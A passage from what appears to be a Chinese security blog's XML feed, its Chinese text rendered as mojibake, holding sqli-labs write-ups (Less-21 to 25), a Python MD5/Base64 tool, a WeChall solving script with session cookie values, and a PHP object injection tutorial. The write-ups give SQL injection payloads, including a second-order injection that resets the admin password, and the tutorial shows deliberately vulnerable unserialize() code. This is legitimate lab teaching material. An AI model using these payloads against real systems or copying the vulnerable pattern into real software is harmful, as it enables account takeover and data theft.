å†…å®¹ï¼šYour Login name:Dumb Your Password:Dumb
</code></pre><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>cookies æ³¨å…¥</p>
<p>ä½†æ˜¯ï¼Œè¿™ä¸€æ¬¡çš„ cookies æ˜¯åŠ å¯†çš„.</p>
<pre><code>setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600);
...
$cookee = base64_decode($cookee);
</code></pre><p>POC:</p>
<pre><code>&apos;) union select 1,2,username from users#
JykgdW5pb24gc2VsZWN0IDEsMix1c2VybmFtZSBmcm9tIHVzZXJzIw==
æ˜¾ç¤ºå¯†ç Dumb
</code></pre><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>å•å¼•å·æ¢æˆåŒå¼•å·å°±è¡Œäº†</p>
<pre><code>uname=IiB1bmlvbiBzZWxlY3QgMSwyLHVzZXJuYW1lIGZyb20gdXNlcnMj
Your Login name:2
Your Password:Dum
</code></pre><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>è¿™ä¸€é¢˜å®ƒåœ¨è¾“å…¥çš„æ—¶å€™è¿‡æ»¤äº†å‡ ä¸ªå­—ç¬¦</p>
<pre><code>$reg = &quot;/#/&quot;;
$reg1 = &quot;/--/&quot;;
$replace = &quot;&quot;;
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
</code></pre><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨ #æ¥æ³¨é‡Šæ‰å‰©ä¸‹çš„æŸ¥è¯¢è¯­å¥ã€‚</p>
<p>é‚£ä¹ˆè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ä¸€ä¸ªåŠæ³•å°±æ˜¯ï¼Œè®©å‰©ä¸‹çš„è¯­å¥å˜å¾—å®Œæ•´å°±è¡Œã€‚</p>
<p>æŸ¥è¯¢è¯­å¥çš„ä»£ç ä¸ºï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€;</p>
</blockquote>
<p>æ„é€ è¯­å¥ï¼š</p>
<blockquote>
<p>?id=1â€™and+â€™1â€™=â€™1</p>
</blockquote>
<h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><p>äºŒæ¬¡æ³¨å…¥</p>
<p>ä¸æ•°æ®åº“äº¤äº’çš„æœ‰ä¸‰ä¸ªé¡µé¢ï¼šlogin_create.phpï¼Œlogin.phpï¼Œpass_change.php</p>
<p>login_create.php,ç™»é™†é¡µé¢å¯¹ç”¨æˆ·å’Œå¯†ç éƒ½è¿›è¡Œäº†å¤„ç†ã€‚</p>
<pre><code>$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
</code></pre><p>login_create.phpå¯¹æ–°å»ºç”¨æˆ·è¿›è¡Œå¤„ç†</p>
<pre><code>$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;
$pass= mysql_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);
</code></pre><p>pass_change.phpæ˜¯ä¿®æ”¹å¯†ç çš„</p>
<p>å…³é”®ä»£ç ï¼š</p>
<pre><code>$username= $_SESSION[&quot;username&quot;];
$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
if($pass==$re_pass)
{    
    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);
    $row = mysql_affected_rows();
    ...
</code></pre><p>å¯ä»¥å‘ç°</p>
<blockquote>
<p>$sql = â€œUPDATE users SET PASSWORD=â€™$passâ€™ where username=â€™$usernameâ€™ and password=â€™$curr_passâ€™ â€œ;</p>
</blockquote>
<p>æ›´æ”¹å¯†ç æ—¶$usernameæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥è¿›å»ï¼Œå¦‚æœ$usernameåé¢æœ‰ä¸ªæ³¨é‡Šç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ç»•è¿‡éªŒè¯$curr_passè€Œç›´æ¥æ›´æ”¹å¯†ç ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦å»ºä¸€ä¸ªæœ‰æ³¨é‡Šç¬¦çš„ç‰¹æ®Šç”¨æˆ·</p>
<pre><code>ç”¨æˆ·åï¼šadmin&apos;+#+
å¯†ç ï¼š 123456
</code></pre><p>ç„¶åç™»é™†ï¼Œè¿›å…¥æ›´æ”¹å¯†ç é¡µé¢</p>
<p>éšä¾¿è¾“å…¥å½“å‰å¯†ç ï¼Œç„¶åè¾“å…¥æˆ‘ä»¬è¦æ›´æ”¹çš„å¯†ç </p>
<pre><code>YOU ARE LOGGED IN AS
admin&apos; # 

You can Change your password here.
Current Password: 123    
New Password:     123456
Retype Password:     123456
</code></pre><p>æäº¤ï¼Œä½ ä¼šå‘ç°ï¼Œadminçš„å¯†ç å·²ç»è¢«æˆ‘ä»¬æ”¹æˆ123456äº†ã€‚</p>
<h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><p>è¿™é¢˜çš„æ„æ€æ˜¯ï¼Œâ€œä½ çš„ AND å’Œ OR éƒ½æ˜¯æˆ‘ä»¬çš„äº†ï¼â€â€¦</p>
<p>å°±æ˜¯ï¼ŒAND å’Œ OR å…¨éƒ¨éƒ½è¢«è¿‡æ»¤æ‰äº†ã€‚</p>
<pre><code>AND==&amp;&amp;
OR==||

?id=1&apos; &amp;&amp; &apos;1&apos;=&apos;1
urlç¼–ç 
?id=1&apos; %26%26 &apos;1&apos;=&apos;1
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pythonå®ç°MD5,Base64åŠ å¯†å°å·¥å…·]]></title>
      <url>/2016/07/29/python%E5%AE%9E%E7%8E%B0MD5_Base64%E5%8A%A0%E5%AF%86%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>ç¨‹åºæ˜¯ä¸€ä¸ª Base64 å’Œ MD5 åŠ å¯†è§£å¯†çš„ç¨‹åºã€‚å¾ˆç®€å•ï¼Œä¸»è¦ç”¨åˆ°äº†hashlibå’Œbase64è¿™ä¸¤ä¸ªåº“ã€‚è€Œä¸”ï¼Œæœ‰è¿™ä¸¤ä¸ªåº“ï¼Œå¯ä»¥éšæ—¶æ‹“å±•æ›´å¤šç§åŠ å¯†æ–¹å¼ï¼Œåƒæ˜¯ sha å•Šä»€ä¹ˆçš„ã€‚è¦æ³¨æ„çš„å°±æ˜¯ä¸‹é¢å‡ ç‚¹ï¼š</p>
<a id="more"></a>
<h2 id="1ï¼‰input-å’Œraw-input-çš„åŒºåˆ«ã€‚"><a href="#1ï¼‰input-å’Œraw-input-çš„åŒºåˆ«ã€‚" class="headerlink" title="1ï¼‰input()å’Œraw_input()çš„åŒºåˆ«ã€‚"></a>1ï¼‰input()å’Œraw_input()çš„åŒºåˆ«ã€‚</h2><p>input()è¦æ±‚çš„è¾“å…¥çš„å­—ç¬¦ä¸²è¦åŠ åŒå¼•å·ï¼Œæ•°å­—çš„è¯ï¼Œç›´æ¥è¾“å…¥å°±å¯ä»¥äº†ã€‚</p>
<p>raw_input()å‡½æ•°å°†è¾“å…¥çš„æ‰€æœ‰æ•°æ®éƒ½å½“åšå­—ç¬¦ä¸²æ¥çœ‹å¾…ï¼Œå³ä½¿è¾“å…¥çš„æ•°å­—ï¼Œä¹Ÿä¼šå˜æˆæ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ã€‚è€Œä¸”ï¼Œæˆ‘ä»¬ç»å¸¸è¦åœ¨ç¨‹åºè¿è¡Œåˆ°æŸå¤„çš„æ—¶å€™ä¸­æ–­ä¸€ä¸‹ã€‚é‚£ä¹ˆï¼Œå°±å¯ä»¥ç”¨raw_input()è¿™ä¸ªå‡½æ•°æ¥ä¸­æ–­ã€‚è¾“å…¥å›è½¦å°±ç»§ç»­è¿è¡Œäº†ã€‚è‹¥æ˜¯ç”¨input()ä¸­æ–­çš„è¯ï¼Œç›´æ¥å›è½¦ä¼šçˆ†é”™ã€‚ã€‚</p>
<h2 id="2ï¼‰Python-é‡Œé¢è²Œä¼¼æ²¡æœ‰ä¸»å‡½æ•°çš„è¯´æ³•"><a href="#2ï¼‰Python-é‡Œé¢è²Œä¼¼æ²¡æœ‰ä¸»å‡½æ•°çš„è¯´æ³•" class="headerlink" title="2ï¼‰Python é‡Œé¢è²Œä¼¼æ²¡æœ‰ä¸»å‡½æ•°çš„è¯´æ³•"></a>2ï¼‰Python é‡Œé¢è²Œä¼¼æ²¡æœ‰ä¸»å‡½æ•°çš„è¯´æ³•</h2><p>æ²¡æœ‰main()ï¼Œæ²¡æœ‰å…¥å£ç‚¹ã€‚é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç ï¼š</p>
<pre><code>if __name__==&quot;__main__&quot;:
    Index();    //ä½ çš„ç¬¬ä¸€ä¸ªå‡½æ•°
</code></pre><p>è¿™æ ·å°±å¯ä»¥è®©ç¨‹åºä»ç¬¬ä¸€ä¸ªå‡½æ•°å¼€å§‹è¿è¡Œäº†ã€‚</p>
<h2 id="3ï¼‰åƒä¸‡æ³¨æ„-TAB-å’Œç©ºæ ¼ã€‚"><a href="#3ï¼‰åƒä¸‡æ³¨æ„-TAB-å’Œç©ºæ ¼ã€‚" class="headerlink" title="3ï¼‰åƒä¸‡æ³¨æ„ TAB å’Œç©ºæ ¼ã€‚"></a>3ï¼‰åƒä¸‡æ³¨æ„ TAB å’Œç©ºæ ¼ã€‚</h2><p>ä¹Ÿå°±æ˜¯ä»£ç çš„æ ¼å¼ã€‚Python æ˜¯ä¸€ä¸ªå¾ˆæ³¨é‡æ ¼å¼çš„è¯­è¨€ã€‚å› ä¸ºæ²¡æœ‰å¤§æ‹¬å·ä¹‹ç±»çš„ï¼Œæ‰€ä»¥åƒæ˜¯å¾ªç¯è¯­å¥ï¼Œåˆ¤æ–­è¯­å¥çš„ï¼Œä¸€å®šè¦æ³¨æ„è¯­å¥å‰é¢çš„ TABã€‚è€Œä¸”ï¼Œåƒä¸‡ä¸è¦ TAB å’Œç©ºæ ¼æ··ç”¨ï¼ä¼šæŠ¥é”™.</p>
<pre><code>import hashlib
import base64
def Index():
    print(&quot;---------Joy_nick&apos;s Encrypt Tool---------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) MD5&quot;);
    print(&quot;2) Base64&quot;);
    while(1):
        choose=input();
        if(choose==1):
            Page_MD5();
        elif(choose==2):
            Page_Base64();

def Page_MD5():
    print(&quot;----------------MD5----------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) MD5 Encrypt&quot;);
    print(&quot;2) MD5 Check&quot;);
    while(1):
        choose=input();
        if(choose==1):
            Page_MD5_Encrypt();
        elif(choose==2):
            Page_MD5_Check();

def Page_Base64():
    print(&quot;--------------Base64---------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Base64 Encrypt&quot;);
    print(&quot;2) Base64 Decrypt&quot;);
    while(1):
        choose=input();
        if(choose==1):
            Page_Base64_Encrypt();
        elif(choose==2):
            Page_Base64_Decrypt();

def Input_From_File():
    path=raw_input(&quot;Please input the file path : &quot;);
    file_handle=open(path,&apos;r&apos;);
    file_contant=file_handle.read();
    file_handle.close();
    return file_contant;

def Input_From_Stdin():
    contant=raw_input(&quot;Please input : &quot;);
    return contant;

def Page_MD5_Encrypt():
    print(&quot;-----------MD5 Encrypt------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=hashlib.md5()
    m.update(contant);
    print(&quot;Do you want to output to a file?(y or n)&quot;);
    while(1):
        choose=raw_input();
        if(choose==&apos;y&apos;):
            file_handle=open(m.hexdigest(),&apos;w&apos;);
            file_handle.write(m.hexdigest());
            file_handle.close();
            exit();
        elif(choose==&apos;n&apos;):
            print(m.hexdigest());
            raw_input();
            exit();

def Page_MD5_Check():
    print(&quot;-----------MD5 Check------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=hashlib.md5()
    m.update(contant);
    MD5=raw_input(&quot;Please input the original MD5:&quot;);
    if(MD5==m.hexdigest()):
        print(&quot;It&apos;s a correct file.&quot;);
    else:
        print(&quot;The file is wrong.&quot;);
    raw_input();
    exit();

def Page_Base64_Encrypt():
    print(&quot;-------------Base64 Encrypt----------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from a file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=base64.b64encode(contant);
    choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;);
    while(1):
        if(choose==&apos;y&apos;):
            file_handle=open(&quot;Base64_%c&quot;%m[1],&apos;w&apos;);
            file_handle.write(m);
            file_handle.close();
            exit();
        elif(choose==&apos;n&apos;):
            print(m);
            raw_input();
            exit();

def Page_Base64_Decrypt():
    print(&quot;--------------Base64 Decrypt------------------&quot;);
    print(&quot;Please choose one:&quot;);
    print(&quot;1) Input from a file&quot;);
    print(&quot;2) Input&quot;);
    while(1):
        choose=input();
        if(choose==1):
            contant=Input_From_File();
            break;
        elif(choose==2):
            contant=Input_From_Stdin();
            break;
    m=base64.b64decode(contant);
    choose=raw_input(&quot;Do you want to save it to a file?(y or n)&quot;);
    while(1):
        if(choose==&apos;y&apos;):
            file_handle=open(&quot;Base64_%c&quot;%m[2],&apos;w&apos;);
            file_handle.write(m);
            file_handle.close();
            exit();
        elif(choose==&apos;n&apos;):
            print(m);
            raw_input();
            exit();

if __name__==&quot;__main__&quot;:
    print(&quot;main&quot;);
    Index();
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> åŠ å¯†è§£å¯† </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pythonè„šæœ¬ä¹‹æ­£åˆ™è¡¨è¾¾å¼]]></title>
      <url>/2016/07/28/python%E8%84%9A%E6%9C%AC%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h1 id="Impossible-nâ€™est-pas-francais"><a href="#Impossible-nâ€™est-pas-francais" class="headerlink" title="Impossible nâ€™est pas franÃ§ais"></a>Impossible nâ€™est pas franÃ§ais</h1><p>webchallçš„ä¸€é“é¢˜ï¼Œé¢˜ç›®è¦æ±‚åˆ†è§£ä¸€ä¸ªå¾ˆå¤§çš„æ•°çš„è´¨å› æ•°ã€‚éœ€è¦6s å†…æäº¤ ä½†æ˜¯ï¼Œåªè¦æˆ‘ä»¬å°è¯•æäº¤ä¸€æ¬¡ä¹‹åï¼Œå°±å¯ä»¥å‘ç°å®ƒä¼šè¿”å›ä¸€ä¸ªæ­£ç¡®çš„è§£ã€‚<br><a id="more"></a><br>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬åªè¦å…ˆæäº¤ä¸€æ¬¡ï¼Œç„¶åç¨‹åºè¯»å–å®ƒè¿”å›çš„æ­£ç¡®æ•°å­—ä¸²ï¼Œå†æäº¤å°±å¯ä»¥äº†ã€‚</p>
<p>åœ¨åŒ¹é…ç½‘é¡µä¿¡æ¯çš„æ—¶å€™ï¼Œpythonå¯ä»¥ä½¿ç”¨åº“beautifulsoupä¹Ÿå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼reæ¨¡å—ï¼Œè¿™é‡Œæˆ‘ä¸¤ä¸ªéƒ½ç”¨äº†ï¼Œä¾¿äºè‡ªå·±å­¦ä¹ ã€‚</p>
<p>pythonè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>#!/usr/bin/env python
# coding=utf-8
import requests
import urllib2
import lxml
import lxml.html as H
from bs4 import BeautifulSoup

cookie = {
    &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos;
}
def get_number():
    number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos;
    #opener = urllib2.build_opener()
    #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;))
    #f = opener.open(number_url)
    #html = f.read()
    #html = urllib2.urlopen(number_url).read()
    #soup = BeautifulSoup(html)
    resp = requests.get(number_url, cookies=cookie)
    res =resp.content
    soup = BeautifulSoup(res)
    div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;page&quot;})
    movie_new = div_new.get_text()
    print movie_new
get_number()

def get_answer():
    post_data = {
        &apos;solution&apos;: &apos;&apos;,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    url = &apos;http://www.wechall.net/challenge/impossible/index.php&apos; 
    resp = requests.post(url, cookies=cookie, data=post_data)
    # print resp.text
    d = H.document_fromstring(resp.text)
    import re
    ar = re.compile(r&apos;&quot;(\d+)&quot;&apos;)
    text = d.xpath(&apos;//div[@class=\&apos;gwf_errors\&apos;]/ul/li&apos;)[0].text_content()
    ans = ar.findall(text)[0]

    print ans 

    post_data = {
        &apos;solution&apos;: ans,
        &apos;cmd&apos;: &apos;Send&apos;,
        &apos;gwf3_csrf&apos;: &apos;bNZbC2XL&apos;
    }
    resp = requests.post(url, cookies=cookie, data=post_data)
    print resp.text
get_answer()
</code></pre><p>è¿è¡Œç»“æœä¸ºï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_yinshifenjie.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> Python </tag>
            
            <tag> writeup </tag>
            
            <tag> WeChall </tag>
            
            <tag> æ­£åˆ™è¡¨è¾¾å¼ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP Object Injection]]></title>
      <url>/2016/07/24/PHP-Object-Injection/</url>
      <content type="html"><![CDATA[<p>PHPå¯¹è±¡æ³¨å…¥å¹¶ä¸æ˜¯ä¸€ç§ååˆ†å¸¸è§çš„æ¼æ´ï¼Œè¿™ç§æ¼æ´å¯èƒ½ä¼šæ¯”è¾ƒéš¾åˆ©ç”¨ï¼Œä½†æ˜¯è¿™ç§æ¼æ´å¯èƒ½æ¯”è¾ƒå±é™©ã€‚ä¸ºäº†å­¦ä¹ è¿™ç§æ¼æ´ï¼Œé¦–å…ˆéœ€è¦ç†è§£åŸºç¡€çš„PHPä»£ç ã€‚<br><a id="more"></a></p>
<h1 id="0x01-PHPçš„ç±»å’Œå¯¹è±¡"><a href="#0x01-PHPçš„ç±»å’Œå¯¹è±¡" class="headerlink" title="0x01 PHPçš„ç±»å’Œå¯¹è±¡"></a>0x01 PHPçš„ç±»å’Œå¯¹è±¡</h1><p>HPä¸­çš„ç±»å’Œå¯¹è±¡ç†è§£èµ·æ¥å¾ˆç®€å•ï¼Œä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼Œä¸‹é¢çš„ä»£ç ä¸­å°±å®šä¹‰äº†ä¸€ä¸ªåŒ…å«ä¸€ä¸ªå˜é‡å’Œä¸€ä¸ªæ–¹æ³•çš„ç±»ï¼š</p>
<pre><code>&lt;?php
class TestClass        //å®šä¹‰ä¸€ä¸ªTestClassç±»
{
public $variable = &apos;This is a string&apos;;          // ä¸€ä¸ªå˜é‡
public function PrintVariable()          // ä¸€ä¸ªç®€å•çš„æ–¹æ³•
{
    echo $this-&gt;variable;
}
}
$object = new TestClass();        // åˆ›å»ºä¸€ä¸ªå¯¹è±¡
$object-&gt;PrintVariable();        // è°ƒç”¨ç±»çš„æ–¹æ³•
?&gt;
</code></pre><h1 id="0x02-PHPè‡ªåŠ¨è½½å…¥"><a href="#0x02-PHPè‡ªåŠ¨è½½å…¥" class="headerlink" title="0x02 PHPè‡ªåŠ¨è½½å…¥"></a>0x02 PHPè‡ªåŠ¨è½½å…¥</h1><p>åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼Œå®ƒä»¬å¯ä»¥è¢«è‡ªåŠ¨åœ°è°ƒç”¨ï¼Œæ‰€ä»¥è¿™äº›å‡½æ•°ä¸éœ€è¦å‡½æ•°è°ƒç”¨æ¥æ‰§è¡Œå®ƒä»¬é‡Œé¢çš„ä»£ç ã€‚è€ƒè™‘åˆ°è¿™ä¸ªç‰¹æ€§ï¼Œè¿™äº›å‡½æ•°é€šå¸¸è¢«ç§°ä¸ºé­”å¹»å‡½æ•°æˆ–é­”å¹»æ–¹æ³•ã€‚é­”å¹»æ–¹æ³•çš„åå­—ä»¥åŒä¸‹åˆ’çº¿â€œ__â€å¼€å¤´PHPé­”å¹»æ–¹æ³•åç§°å—é™äºPHPæ‰€æ”¯æŒçš„éƒ¨åˆ†å…³é”®å­—ï¼Œä¾‹å¦‚constructã€destructç­‰ç­‰ã€‚</p>
<p>ä¾‹å¦‚__construct()æ–¹æ³•ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå¯¹åº”çš„__destructåˆ™ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨ç­‰ç­‰ã€‚</p>
<p>ä¸‹é¢æ˜¯PHPä¸­çš„ä¸€äº›é­”å¹»å‡½æ•°ï¼š</p>
<pre><code>__construct(), __destruct(), __call(), __callStatic(), __get(), __set(),
__isset(), __unset(), __sleep(), __wakeup(), __toString(), 
__invoke(), __set_state(), __clone(), and __autoload().
</code></pre><h1 id="0x03-PHPå¯¹è±¡çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#0x03-PHPå¯¹è±¡çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="0x03 PHPå¯¹è±¡çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>0x03 PHPå¯¹è±¡çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><p>phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºåºåˆ—åŒ–ï¼Œå³serialize()å‡½æ•°ï¼Œå¯¹åº”çš„ååºåˆ—åŒ–å°±æ˜¯unserialize()ã€‚<br>ç®€å•çš„è¯´ï¼Œåºåˆ—åŒ–å°±æ˜¯æŠŠPHPå¯¹è±¡æŒ‰ç…§ä¸€å®šè§„åˆ™å­˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œååºåˆ—åŒ–å°±æ˜¯æŠŠåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²æ¢å¤æˆä¸€ä¸ªPHPå¯¹è±¡.</p>
<p><strong>PHPå¯¹è±¡çš„åºåˆ—åŒ–</strong></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%BA%8F%E5%88%97%E5%8C%961-1.png" alt=""></p>
<p>ç†è§£åºåˆ—åŒ–çš„å­—ç¬¦ä¸²:</p>
<pre><code>O:4{               ä»¥åˆ†å·éš”å¼€ï¼Œä¸€å…±æœ‰å››æ®µæ•°æ®

&quot;test&quot;:2           testç±»ï¼Œä¸€å…±æœ‰2ä¸ªå¯¹è±¡

s:8:&quot;username&quot;     Stringç±»å‹, é•¿åº¦ä¸º8, å€¼ä¸ºusername

s:6:&quot;serial&quot;       Stringç±»å‹, é•¿åº¦ä¸º6, å€¼ä¸ºserial

s:8:&quot;password&quot;     Stringç±»å‹, é•¿åº¦ä¸º8, å€¼ä¸ºpassword

s:6:&quot;serial&quot;       Stringç±»å‹, é•¿åº¦ä¸º6, å€¼ä¸ºserial
</code></pre><p><strong>PHPå¯¹è±¡çš„ååºåˆ—åŒ–</strong></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%BA%8F%E5%88%97%E5%8C%961-2.png" alt=""></p>
<p>ç»è¿‡unserialize()ä¹‹åï¼Œæˆ‘ä»¬çš„å¯¹è±¡åˆè¢«é‡å»ºäº†å‡ºæ¥.</p>
<h1 id="0x04-PHPå¯¹è±¡æ³¨å…¥"><a href="#0x04-PHPå¯¹è±¡æ³¨å…¥" class="headerlink" title="0x04 PHPå¯¹è±¡æ³¨å…¥"></a>0x04 PHPå¯¹è±¡æ³¨å…¥</h1><p>æœ‰ä¸¤ä¸ªæ¯”è¾ƒç‰¹åˆ«çš„Magicæ–¹æ³•ï¼Œ__sleep æ–¹æ³•ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ã€‚ __wakeupæ–¹æ³•ä¼šåœ¨ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ã€‚</p>
<p>é‚£ä¹ˆï¼Œè€ƒè™‘è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…çš„æ•°æ®æ˜¯é€šè¿‡unserialize()æ–¹æ³•ä¼ é€’çš„ï¼Œé‚£ä¹ˆè¿™æ ·å°±å¾ˆå¯èƒ½å¼•å‘â€œphpå¯¹è±¡æ³¨å…¥â€ï¼Œè€Œå¾ˆå¯èƒ½é‚£äº›ä¸è¯¥å¯¹è±¡æœ‰å…³çš„Magicæ–¹æ³•ä¼šæ‰§è¡Œä¸€äº›æ•ˆæœï¼Œæ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœè¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªè®°å½•ä¸´æ—¶æ–‡ä»¶çš„å¯¹è±¡ï¼Œå½“å¯¹è±¡åˆ›å»ºçš„æ—¶å€™ï¼Œå³ä¼šè°ƒç”¨ __constructæ–¹æ³•ï¼Œæ­¤æ—¶ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œ __destructåˆ™ä¼šåˆ é™¤åˆ›å»ºçš„æ–‡ä»¶ã€‚è€Œæ­¤æ—¶æ°å¥½æˆ‘ä»¬å¯ä»¥æ„é€ è¾“å…¥é€šè¿‡unserialize()ä¼ é€’ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹æˆ‘ä»¬çš„è¾“å…¥ç¨ä½œåŠ å·¥å°±å¯ä»¥å®Œæˆè¾“å…¥æˆ‘ä»¬æƒ³è¦è¾“å…¥çš„ã€‚</p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<pre><code>&lt;?php 
class test
{
    public $filename = &apos;temp.txt&apos;;
    public function LogData($text)
    {
        file_put_contents($this-&gt;filename, $text, FILE_APPEND);        //file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ä¸ä¾æ¬¡è°ƒç”¨ fopen()ï¼Œfwrite() ä»¥åŠ fclose() åŠŸèƒ½ä¸€æ ·ã€‚
    }
    public function __destruct()
    {
        unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;filename);        //unlink() å‡½æ•°åˆ é™¤æ–‡ä»¶
    }
}
class user
{
    public $age = 0;
    public $name = &apos;&apos;;
    public function PrintData()
    {
        echo &apos;Username:&apos;.$this-&gt;name.&apos;&lt;br&gt;&apos;.&apos;age:&apos;.$this-&gt;age;
    }
}
if(isset($_GET[&apos;user&apos;]))
    $usr = unserialize($_GET[&apos;user&apos;]);
?&gt;
